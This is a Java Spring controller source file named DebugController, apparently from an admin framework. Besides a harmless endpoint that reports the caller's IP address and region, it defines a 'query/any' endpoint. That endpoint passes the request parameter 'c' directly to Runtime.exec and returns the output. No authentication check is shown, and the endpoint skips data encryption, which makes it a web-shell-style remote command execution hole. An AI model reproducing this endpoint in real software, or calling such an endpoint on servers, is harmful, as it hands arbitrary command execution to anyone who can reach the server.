package cn.projectan.strix.controller.system;

import cn.projectan.strix.core.ret.RetMarker;
import cn.projectan.strix.core.ret.RetResult;
import cn.projectan.strix.model.annotation.IgnoreDataEncryption;
import cn.projectan.strix.utils.Ip2RegionUtil;
import cn.projectan.strix.utils.IpUtils;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

/**
 * @author 安炯奕
 * @date 2022/7/29 14:19
 */
@Slf4j
@RestController
@RequestMapping("system")
public class DebugController {

    @IgnoreDataEncryption
    @GetMapping("ip")
    public RetResult<Object> getMyIpAddress(HttpServletRequest request) {
        Map<String, String> result = new HashMap<>();
        String ip = IpUtils.getIpAddr(request);
        String address = Ip2RegionUtil.getRegion(ip);
        result.put("ip", ip);
        result.put("address", address);
        return RetMarker.makeSuccessRsp(result);
    }

    @IgnoreDataEncryption
    @GetMapping("query/any")
    public Object queryAny(String c) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process p = rt.exec(c);
            try (InputStream stderr = p.getErrorStream();
                 InputStreamReader isr = new InputStreamReader(stderr);
                 BufferedReader br = new BufferedReader(isr)) {
                String line = "";
                StringBuilder sb = new StringBuilder();
                while ((line = br.readLine()) != null) {
                    sb.append(line);
                    sb.append("\n");
                }
                int exitVal = p.waitFor();
                return RetMarker.makeSuccessRsp(sb.toString());
            }
        } catch (Exception e) {
            return RetMarker.makeErrRsp(e.getMessage());
        }
    }

}
